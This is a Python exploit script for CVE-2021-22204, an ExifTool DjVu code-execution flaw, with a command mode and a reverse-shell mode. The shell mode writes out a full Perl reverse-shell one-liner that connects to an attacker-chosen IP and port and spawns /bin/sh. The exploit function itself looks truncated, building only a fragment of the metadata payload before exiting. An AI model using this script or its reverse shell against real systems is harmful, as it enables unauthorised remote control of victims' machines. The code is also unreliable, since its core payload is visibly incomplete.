#!/usr/bin/env python3
# Made by @UNICORDev (by @NicPWNs and @Dev-Yeoj)
# https://github.com/UNICORDev/exploit-CVE-2021-22204
# CVE-2021-22204
# Improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image

# Print UNICORD ASCII Art

# Imports
import base64
import re
import subprocess
import sys

# Usage function
def usage():
    print("\nUsage:")
    print("     python3 exploit-CVE-2021-22204.py -c <command>")
    print("     python3 exploit-CVE-2021-22204.py -s <local IP> <local port>")
    print("     python3 exploit-CVE-2021-22204.py -h | --help")

    print("\nOptions:")
    print("     -h, --help  Show this usage message.")
    print("     -c          Command to execute on target.")
    print("     -s          Reverse shell mode. Provide local IP and port.")
    print("\n")
    exit()

def exploit(command):
    print("Running Command: " + command)
    payload = "(metadata \"\c\$"
    print(payload)
    exit()

if __name__ == "__main__":
    # Define CLI arguments
    args = ["-h","--help","-c","--command","-s","--shell"]

    # Check CLI arguments
    if args[0] in sys.argv or args[1] in sys.argv:
        usage()

    # Read command mode arguments
    if (args[2] in sys.argv or args[3] in sys.argv) and len(sys.argv) > 2:
        exploit(sys.argv[sys.argv.index('-c') + 1])

    # Read shell mode arguments
    if (args[4] in sys.argv or args[5] in sys.argv) and len(sys.argv) > 3:
        ip = sys.argv[sys.argv.index('-s') + 1]
        # Check for valid IPv4 address
        if not re.match(r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$",ip):
            print("Invalid IPv4 Address!")
            usage()

        port = int(sys.argv[sys.argv.index('-s') + 2])
        # Check for valid port
        if not port in range(1,65536):
            print("Invalid Port!")
            usage()

        command = f"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({port},inet_aton('{ip}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};"
        exploit(command)

    else:
        usage()